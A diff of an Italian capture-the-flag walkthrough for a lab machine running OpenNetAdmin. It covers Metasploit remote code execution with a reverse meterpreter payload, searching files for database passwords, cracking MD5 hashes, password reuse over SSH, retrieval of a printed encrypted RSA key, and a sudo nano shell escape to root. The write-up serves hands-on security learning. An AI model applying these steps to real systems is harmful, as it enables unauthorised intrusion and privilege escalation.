@@ -1,19 +1,23 @@
-1) Scovata la pagina 10.10.10.171/ona/
-Risulta essere vulnerabile all'exploit "OpenNetAdmin 18.1.1 - Remote Code Execution"
-Importo il .rb dentro metasploit, lo lancio, metto come payload il linux/x32/meterpreter/reverse_tcp
-Lo lancio ed ho meterpreter.
+## Information Gathering  + Exploiting ##
 
-2) Scopro un file di config con delle credenziali di un DB, grazie al comando:
+* Scovata la pagina 10.10.10.171/ona/
 
-grep -rnw . -e 'db_passwd'  
+* Risulta essere vulnerabile all'exploit "OpenNetAdmin 18.1.1 - Remote Code Execution"
+
+* Importo il .rb dentro metasploit, lo seleziono con "use", setto il payload "linux/x64/meterpreter/reverse_tcp"
+
+## Post-Exploitation - User 1 Escalation - ##
+
+* Scopro un file di config con delle credenziali di un DB, grazie al comando:
+
+$ grep -rnw . -e 'db_passwd'  
 ./plugins/ona_nmap_scans/install.php:153:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
 ./include/functions_db.inc.php:102:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
 ./include/functions_db.inc.php:108:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
 ./include/functions_db.inc.php:150:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
 --->>>> ./local/config/database_settings.inc.php:13:        'db_passwd' => 'n1nj4W4rri0R!',
 
-
-##
+* Contenuto del file:
 <?php
 
 $ona_contexts=array (
@@ -35,31 +39,47 @@ $ona_contexts=array (
     'context_color' => '#D3DBFF',
   ),
 );
-##
 
-3) Uso il comando mysql -u ona_sys -p ona_default -e 'show tables'
-> Quindi, mysql -u ona_sys -p ona_default -e 'select * from users'
-> Scopro:
+
+* mysql -u ona_sys -p ona_default -e 'show tables'
+
+* mysql -u ona_sys -p ona_default -e 'select * from users'
+
 id      username        password        level   ctime   atime
 1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-02-15 13:47:44     2020-02-15 13:47:43
 2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
 
-4) Ho usato CrackStation per rompere gli MD5, risultato:
+* Uso CrackStation per rompere gli MD5, risultato:
 1 test
 2 admin
 
-5) Ho vinto il premio dell'anno per PirlaSummaCumLaude, ho fatto ssh jimmy@10.10.10.171 e la password era... n1nj4W4rri0R!
+* Ho vinto il premio dell'anno per PirlaSummaCumLaude, ho fatto ssh jimmy@10.10.10.171 e la password era... n1nj4W4rri0R!
+RabbitHole il DB!
 
-6) Ho trovato nella folder /home/jimmy/.ssh la seguente stringa:
+## Post-Exploitation - User 2 Escalation - ##
+
+* Ho trovato nella folder /home/jimmy/.ssh la seguente stringa:
 |1|+jHNuEBNL1R1f9YVJsKhsHWRw24=|p4AqqwkcMx9DwyxPRhzcCxxJR1U= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
 
-7) Nope tutte robe inutili, dentro /var/www/internal/main.php c'è una funzioncina che ti stampa a video la chiave RSA di Joanna. La invoco con:
-curl 127.0.0.1/main.php 
-ma non succede nulla, quindi con:
-netstat -tulpn
-trovo altre porte aperte in ascolto, tra cui: 52846
-Quindi con il comando: curl http://127.0.0.1:52846/main.php
-Recupero l'id_rsa di Joanna:
+  ** Nope tutte robe inutili
+  
+* Lanciato grep da / per tutte le folder con Jimmy come owner
+
+* Rilevata folder "/var/www/internal/" con "main.php" interessante.
+
+* C'è una funzioncina che ti stampa a video la chiave RSA di Joanna. La invoco con:
+
+    curl 127.0.0.1/main.php
+    
+* Non succede nulla, quindi cerco altre eventuali porte in ascolto:
+
+    netstat -tulpn
+    
+* Trovo altre porte aperte in ascolto, tra cui: 52846
+
+* curl http://127.0.0.1:52846/main.php
+
+* Recupero l'id_rsa di Joanna:
 
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -92,20 +112,32 @@ z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
 K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
 -----END RSA PRIVATE KEY-----
 
-8) La chiave è protetta da passphrase, la rompo e scopro che è:
-"bloodninjas"
+* La chiave è protetta da passphrase, la rompo con John e scopro che è:
 
-9) Apro una nuova sessione con Joanna:
-ssh -i id_rsa_joanna joanna@10.10.10.171
-E prelevo il flag! 
+    "bloodninjas"
 
-10) Si comincia per il root! Con "sudo -l" scopro che Joanna è abilitata a lanciare sudo senza password "sudo /bin/nano /opt/priv", lo lancio e mi apre una sessione di nano.
-GTFOBins mi suggerisce come spawnare una shell: CTRL+R CTRL+X e poi "reset; sh 1>&0 2>&0"
+* Apro una nuova sessione con Joanna:
+    
+    ssh -i id_rsa_joanna joanna@10.10.10.171
 
-11) Avrò una root shell a questo punto e potrò fare cat /root/root.txt ed ottenere il flag finale! 
+*#*#* Prelevo User Flag! *#*#*
 
-11 - BIS)
-In alernativa posso aggiungere un utente al file /etc/psswd! Apro il nano in sudo come al punto 11, quindi:
-CTRL+O
-etc/psswd
-Aggiungo un utente root.
+## Post-Exploitation - Root Privilege Escalation - ##
+
+* Si comincia per il root! Con "sudo -l" scopro che Joanna è abilitata a lanciare sudo senza password "sudo /bin/nano /opt/priv", lo lancio e mi apre una sessione di nano.
+
+* GTFOBins mi suggerisce come spawnare una shell con privilegi di root: 
+    
+    CTRL+R CTRL+X e poi "reset; sh 1>&0 2>&0"
+
+* cat /root/root.txt 
+
+*#*#* Prelevo ROOT's Flag! *#*#*
+
+BIS) In alernativa posso aggiungere un utente al file /etc/psswd! Apro il nano in sudo come al punto 11, quindi:
+
+  CTRL+O
+
+  etc/psswd
+
+  Aggiungo un utente root.
